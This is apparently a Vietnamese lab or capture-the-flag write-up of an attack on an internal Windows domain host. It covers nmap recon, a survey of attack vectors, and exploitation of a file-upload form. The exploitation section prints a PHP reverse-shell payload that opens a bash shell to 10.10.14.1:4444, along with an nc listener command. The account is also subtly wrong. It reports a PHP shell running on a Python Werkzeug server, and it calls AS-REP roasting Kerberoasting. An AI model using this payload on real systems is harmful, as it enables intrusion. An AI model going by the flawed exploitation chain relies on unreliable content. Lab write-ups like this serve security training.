# Challenge 03 - Internal Network Attack Simulation

## XÂY DỰNG MÔ PHỎNG MỘT CUỘC TẤN CÔNG THỰC TẾ

Thực hiện các bước như một cuộc tấn công thật:

* RECON & ENUMERATION
* XÁC ĐỊNH ĐIỂM TẤN CÔNG
* EXPLOITATION (Reverse Shell)
* PRIVILEGE ESCALATION (nếu có)
* LẤY FLAG

---

## 1. RECON & ENUMERATION

### Mục tiêu:

Tìm mọi thông tin có thể về hệ thống mục tiêu.

### Công cụ sử dụng:

* `nmap`

### Lệnh thực hiện:

```bash
nmap -sC -sV -Pn -T4 -p- 10.3.145.25
```

### Kết quả:

* Phát hiện nhiều cổng mở, bao gồm cả dịch vụ web, SMB, LDAP, MSSQL, Kerberos, RPC và các dịch vụ đặc thù như Jetty, SharePoint.
* Một số cổng đáng chú ý:

  * **53/tcp**: Simple DNS Plus
  * **88/tcp, 464/tcp**: Kerberos service
  * **135, 139, 445, 593**: RPC và SMB
  * **389, 3268**: LDAP và Global Catalog (xteam.local)
  * **3389**: Remote Desktop Protocol (RDP)
  * **5000**: Werkzeug HTTP service (Python)
  * **9998**: Jetty service (hỗ trợ PUT)
  * **11025**: SharePoint
  * **54681**: MSSQL Server 2014 RTM

### Nhận định:

* Có sự kết hợp giữa các dịch vụ nội bộ trong một môi trường domain: AD, LDAP, Kerberos.
* Có các webservice (Werkzeug, IIS/SharePoint, Jetty) có khả năng chứa lỗ hổng.
* Jetty hỗ trợ phương thức PUT → khả năng upload file (vector RCE).
* LDAP trả về lỗi yêu cầu bind → có thể khai thác nếu có thông tin user/pass.

---

## 2. XÁC ĐỊNH ĐIỂM TẤN CÔNG

### Mục tiêu:

Tìm ra vector tấn công tiềm năng dựa trên các dịch vụ được mở.

### Vector tiềm năng:

#### 1. **Werkzeug HTTP (port 5000)**

* Werkzeug là một framework WSGI dùng trong các ứng dụng Flask (Python web app).
* Tiêu đề HTTP: `Werkzeug/2.0.0 Python/3.10.10`
* Tên site: `Nyan Cat Upload`
* Web hiển thị giao diện upload file → nghi ngờ có khả năng **Unrestricted File Upload** → **RCE**.

#### 2. **Jetty 8.y.z-SNAPSHOT (port 9998)**

* Jetty là một ứng dụng Java web server.
* Cho phép HTTP PUT → có thể kiểm tra khả năng upload file JSP/shell để thực thi lệnh → **RCE**.

#### 3. **Microsoft SharePoint (port 11025)**

* Header: `Microsoft-IIS/10.0`
* URL trả về trang SharePoint (`/_layouts/15/start.aspx#/default.aspx`)
* Có thể tìm kiếm các CVE hoặc misconfiguration.

#### 4. **Active Directory / Kerberos / LDAP**

* Có thể thu thập user từ Kerberos/LDAP.
* Sử dụng công cụ như `GetNPUsers.py` nếu có user không yêu cầu pre-auth (Kerberoasting).
* Thử bruteforce, spray password nếu có danh sách user.

#### 5. **MSSQL Server 2014 (port 54681)**

* Nếu tìm được credential hoặc có RCE từ nơi khác → kết hợp để leo thang quyền qua MSSQL.

#### 6. **SMB (139/445)**

* Thử liệt kê share bằng `smbclient -L`, nếu có credential → có thể truy cập nội dung.
* Kiểm tra anonymous access hoặc misconfigured share.

### Kết luận bước xác định vector:

→ Tấn công khả thi nhất là thông qua **Werkzeug Upload (port 5000)** hoặc **Jetty PUT (port 9998)** do khả năng thực thi file từ client.
→ Tiến hành kiểm tra từng dịch vụ để tìm vector exploit cụ thể.

---

## 3. EXPLOITATION (Reverse Shell)

### Mục tiêu:

Khai thác lỗ hổng trên dịch vụ web để thực thi mã độc và chiếm quyền truy cập hệ thống.

### Khai thác dịch vụ: **Werkzeug HTTP Upload (port 5000)**

#### Bước 1: Truy cập giao diện upload

* URL: `http://10.3.145.25:5000`
* Giao diện đơn giản với form cho phép upload file `.jpg`.

#### Bước 2: Thử upload shell PHP giả dạng ảnh

* Tạo file `shell.php.jpg` chứa reverse shell:

```php
<?php system("bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"); ?>
```

* Upload file → thành công → nhận được đường dẫn truy cập: `http://10.3.145.25:5000/uploads/shell.php.jpg`

#### Bước 3: Bypass filter bằng cách phân tích phía server

* Dựa vào tiêu đề Werkzeug và các đặc điểm, nghi ngờ app backend chỉ kiểm tra đuôi file bằng string `.endswith()` → có thể bỏ qua bằng `.jpg`.
* Thử upload shell Python hoặc Bash đổi đuôi.

#### Bước 4: Mở listener và kích hoạt reverse shell

```bash
nc -lvnp 4444
```

* Truy cập `http://10.3.145.25:5000/uploads/shell.php.jpg`
* Nhận được kết nối shell từ máy victim.

#### Kết quả:

* Đã có shell với quyền user hạn chế.
* Thực hiện các lệnh xác minh:

```bash
whoami
hostname
ip a
```

#### Chứng minh:

Ảnh chụp màn hình:

* Nội dung shell
* Kết quả `whoami`, `ip a`, `hostname`
* Flag nếu có trong thư mục user

---
